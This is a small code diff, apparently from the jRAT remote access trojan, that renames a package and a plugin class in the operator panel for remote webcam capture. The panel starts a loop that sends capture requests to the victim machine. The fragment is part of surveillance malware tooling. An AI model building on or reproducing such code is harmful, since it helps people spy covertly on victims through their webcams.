@@ -1,4 +1,4 @@
-package org.jrat.project.client.plugin;
+package pro.jrat.client.webcam;
 
 import java.awt.Color;
 import java.awt.event.ActionEvent;
@@ -65,7 +65,7 @@ public class PanelWebcam extends BaseControlPanel {
 		tglbtnEnable.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
 				try {
-					WebcamPlugin.enabled = true;						
+					Plugin.enabled = true;						
 					new Thread(new Runnable() {
 						@Override
 						public void run() {
@@ -73,7 +73,7 @@ public class PanelWebcam extends BaseControlPanel {
 								while (true) {
 									getServer().addToSendQueue(new Packet(getServer()));
 									
-									if (!WebcamPlugin.enabled) {
+									if (!Plugin.enabled) {
 										return;
 									}
 									
@@ -188,7 +188,7 @@ public class PanelWebcam extends BaseControlPanel {
 	
 	public void disableCapturing() {
 		try {
-			WebcamPlugin.enabled = false;
+			Plugin.enabled = false;
 			Thread.sleep((int) spInterval.getValue());
 			getServer().addToSendQueue(new Packet(getServer()));
 		} catch (Exception e) {					
